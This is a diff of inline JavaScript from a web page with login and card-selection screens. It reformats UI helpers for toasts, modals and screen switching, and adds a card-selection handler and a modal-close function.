-        // Show/hide screens (Keep as is)
-        function showMainApp() { document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; }
-        function showAuthScreen() { document.getElementById('authScreen').style.display = 'flex'; document.getElementById('mainApp').style.display = 'none'; }
+        function selectCard(card, fee) {
+            selectedCard = card;
+            document.querySelectorAll('.card-option').forEach(el => el.classList.remove('selected'));
+            event.currentTarget.classList.add('selected');
+        }
 
-        // Toast (Keep as is)
-        function showToast(message) { const toast = document.getElementById('toast'); document.getElementById('toastMessage').textContent = message; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
-        function showAuthError(message) { document.getElementById('authError').textContent = message; }
-        function showErrorModal(message) { document.getElementById('errorCode').textContent = ''; document.getElementById('errorTitle').textContent = 'Feature Unavailable'; document.getElementById('errorMessage').innerHTML = message; document.getElementById('errorModal').classList.add('active'); }
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
 
-        // Close modals on outside click (Keep as is)
-        document.querySelectorAll('.modal-overlay').forEach(modal => { modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('active'); }); });
+        function updateAvailableBalance() {
+            // Optional: Show available balance
+        }
 
-        // Initialize (Keep as is)
+        // Show/hide screens
+        function showMainApp() {
+            document.getElementById('authScreen').style.display = 'none';
+            document.getElementById('mainApp').style.display = 'block';
+        }
+
+        function showAuthScreen() {
+            document.getElementById('authScreen').style.display = 'flex';
+            document.getElementById('mainApp').style.display = 'none';
+        }
+
+        // Toast
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMessage').textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // Auth error
+        function showAuthError(message) {
+            document.getElementById('authError').textContent = message;
+        }
+
+        function showErrorModal(message) {
+            document.getElementById('errorCode').textContent = '';
+            document.getElementById('errorTitle').textContent = 'Feature Unavailable';
+            document.getElementById('errorMessage').innerHTML = message;
+            document.getElementById('errorModal').classList.add('active');
+        }
+
+        // Close modals on outside click
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) modal.classList.remove('active');
+            });
+        });
+
+        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
+            // Check for saved session
             const rememberedUser = localStorage.getItem('rememberedUser');
-            if (rememberedUser) { document.getElementById('loginEmail').value = rememberedUser; document.getElementById('rememberMe').checked = true; }
+            if (rememberedUser) {
+                document.getElementById('loginEmail').value = rememberedUser;
+                document.getElementById('rememberMe').checked = true;
+            }
         });
     </script>
 </body>
